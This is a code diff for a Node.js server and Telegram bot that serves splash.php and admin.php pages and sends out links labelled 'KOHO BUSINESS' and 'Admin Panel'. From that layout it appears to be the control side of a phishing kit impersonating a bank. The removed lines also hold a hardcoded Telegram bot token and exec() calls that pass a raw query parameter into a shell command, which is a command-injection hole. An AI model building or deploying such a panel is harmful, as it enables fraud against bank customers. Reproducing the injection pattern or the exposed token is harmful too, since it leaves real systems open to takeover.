@@ -1,71 +1,126 @@
-#!/usr/bin/env node
-import fs from "fs";
-import path from "path";
-import express from "express";
-import { exec } from "child_process";
-import TelegramBot from "node-telegram-bot-api";
-import { fileURLToPath } from "url";
+import express from 'express';
+import fs from 'fs-extra';
+import path from 'path';
+import TelegramBot from 'node-telegram-bot-api';
+import { fileURLToPath } from 'url';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-const WWW = path.join(__dirname, "www");
-const LOGS = path.join(__dirname, "logs");
-const DATA = path.join(__dirname, "data");
-const WATCHERS_FILE = path.join(DATA, "users.json");
+const DOT_WWW = path.join(__dirname, '.www');
+const WWW = path.join(__dirname, 'www');
+const LOGS = path.join(__dirname, '.logs');
+const DATA = path.join(__dirname, '.data');
+const WATCHERS_FILE = path.join(DATA, 'watchers.json');
 
-const BOT_TOKEN = "8372102152:AAHb50tvjQnKQiQ_iAYkA4lFSoKwJO85NmQ";
-const PUBLIC_URL = process.env.RENDER_EXTERNAL_URL;
+fs.ensureDirSync(LOGS);
+fs.ensureDirSync(DATA);
+fs.ensureDirSync(WWW);
 
-if(!BOT_TOKEN) throw "Missing BOT_TOKEN";
-if(!PUBLIC_URL) throw "Missing PUBLIC_URL";
+// Copy .www → www
+fs.copySync(DOT_WWW, WWW, { overwrite: true });
 
-[LOGS, DATA, WWW].forEach(d => { if(!fs.existsSync(d)) fs.mkdirSync(d, {recursive:true}) });
+// Load watchers
+let watchers = new Set();
+if (fs.existsSync(WATCHERS_FILE)) {
+    try {
+        watchers = new Set(JSON.parse(fs.readFileSync(WATCHERS_FILE, 'utf8')));
+    } catch {}
+}
 
-const bot = new TelegramBot(BOT_TOKEN, {polling:true});
-let USERS = {};
+// ──────────────────────
+// CONFIG
+// ──────────────────────
+const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
+const PUBLIC_URL = process.env.RENDER_EXTERNAL_URL || 'http://localhost:3000';
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-if(fs.existsSync(WATCHERS_FILE)) USERS = JSON.parse(fs.readFileSync(WATCHERS_FILE));
-
-// Express to serve PHP via php-cli
+// ──────────────────────
+// EXPRESS SERVER
+// ──────────────────────
 const app = express();
+
+// Serve static files
 app.use(express.static(WWW));
 
-app.get("/splash.php", (req,res)=>{
-    exec(`php ${path.join(WWW,"index.php")}`, (err, stdout)=>{
-        res.send(stdout);
-    });
+// Redirect root to splash.php
+app.get('/', (req, res) => {
+    res.redirect('/splash.php');
 });
 
-app.get("/admin.php", (req,res)=>{
-    exec(`php ${path.join(WWW,"admin.php")} key=${req.query.key || ""}`, (err, stdout)=>{
-        res.send(stdout);
-    });
-});
+// Fallback route
+app.use((req,res) => res.status(404).send("404 Not Found"));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, ()=>console.log(`PHP Panel accessible at port ${PORT}`));
+app.listen(PORT, () => console.log(`Web server running @ ${PORT}`));
 
-// Telegram Handlers
-bot.onText(/\/start/, (msg)=>{
-    const cid = msg.chat.id;
-    if(!USERS[cid]) USERS[cid] = { key: Math.random().toString(36).slice(2,10) };
-    fs.writeFileSync(WATCHERS_FILE, JSON.stringify(USERS,null,2));
-    bot.sendMessage(cid, `Welcome! Your admin key: ${USERS[cid].key}`, {
-        reply_markup: {
-            keyboard:[
-                ["▶️ Open Panel","📊 Status","❓ Help"]
-            ],
-            resize_keyboard:true
-        }
-    });
+// ──────────────────────
+// TELEGRAM BOT
+// ──────────────────────
+const mainKeyboard = {
+    keyboard: [
+        ["▶️ START","📎 LINKS MENU","⏹ STOP"],
+        ["📊 STATUS","📝 LOGS","👁 WATCH"],
+        ["❓ HELP","⚠️ DISCLAIMER","⚙️ SETTINGS"]
+    ],
+    resize_keyboard: true
+};
+
+const inlineLinks = [
+    { text: "KOHO BUSINESS", url: `${PUBLIC_URL}/splash.php` },
+    { text: "Admin Panel", url: `${PUBLIC_URL}/admin.php` }
+];
+
+bot.onText(/\/start/, (msg) => {
+    watchers.add(msg.chat.id);
+    fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...watchers]));
+    bot.sendMessage(msg.chat.id, "Welcome! Panel initialized.", { reply_markup: mainKeyboard });
 });
 
-bot.on("message", msg=>{
+// Message handler
+bot.on('message', async (msg) => {
+    const text = (msg.text || '').toUpperCase();
     const cid = msg.chat.id;
-    const txt = (msg.text||"").toLowerCase();
-    if(txt.includes("panel") || txt.includes("open")){
-        const u = USERS[cid];
-        bot.sendMessage(cid, `Open your panel: ${PUBLIC_URL}/admin.php?key=${u.key}`);
+    watchers.add(cid);
+    fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...watchers]));
+
+    if (text.includes("START")) {
+        bot.sendMessage(cid, "Links ready:", {
+            reply_markup: { inline_keyboard: inlineLinks.map(link => [link]) }
+        });
+    }
+
+    if (text.includes("LINK")) {
+        bot.sendMessage(cid, "Quick links:", {
+            reply_markup: { inline_keyboard: inlineLinks.map(link => [link]) }
+        });
+    }
+
+    if (text.includes("STATUS")) {
+        bot.sendMessage(cid, `Web online @ ${PUBLIC_URL}`, { reply_markup: mainKeyboard });
+    }
+
+    if (text.includes("WATCH")) {
+        if (watchers.has(cid)) {
+            watchers.delete(cid);
+            bot.sendMessage(cid, "Watch disabled");
+        } else {
+            watchers.add(cid);
+            bot.sendMessage(cid, "Watch enabled");
+        }
+        fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...watchers]));
+    }
+
+    if (text.includes("HELP")) {
+        bot.sendMessage(cid, "Commands: START, LINKS, STATUS, WATCH", { reply_markup: mainKeyboard });
     }
 });
+
+// Simple status monitor
+setInterval(() => {
+    watchers.forEach(cid => {
+        bot.sendMessage(cid, `Webserver is up: ${PUBLIC_URL}`);
+    });
+}, 60000);
+
+console.log("Panel + Telegram bot online");
